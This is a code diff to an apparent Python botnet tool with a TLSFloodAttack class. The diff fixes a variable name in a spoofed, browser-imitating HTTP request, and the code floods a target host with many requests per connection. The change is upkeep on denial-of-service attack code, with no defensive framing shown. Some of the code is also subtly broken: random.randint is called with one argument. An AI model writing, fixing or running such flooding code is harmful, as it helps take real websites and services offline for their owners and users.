@@ -1892,7 +1892,7 @@ class TLSFloodAttack:
                 # Generate HTTP request with TLS
                 user_agent = self.get_random_user_agent()
                 byt = f"{self.method} /{url_path} HTTP/1.1\r\nHost: {target['host']}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n".encode()
-                byt2 = f"{self.methods} /{url_path}  HTTP/1.1\r\nHost: {target['host']}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Ungoogled-Chromium/98.0.4758.102\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n".encode()
+                byt2 = f"{self.method} /{url_path}  HTTP/1.1\r\nHost: {target['host']}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Ungoogled-Chromium/98.0.4758.102\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n".encode()
                 # Send multiple requests per connection
                 for _ in range(random.randint(500)):
                     if self.stop_event.is_set() or not self.running:
@@ -2826,3 +2826,4 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"[-] Bot error: {e}")
         bot.stop()
+
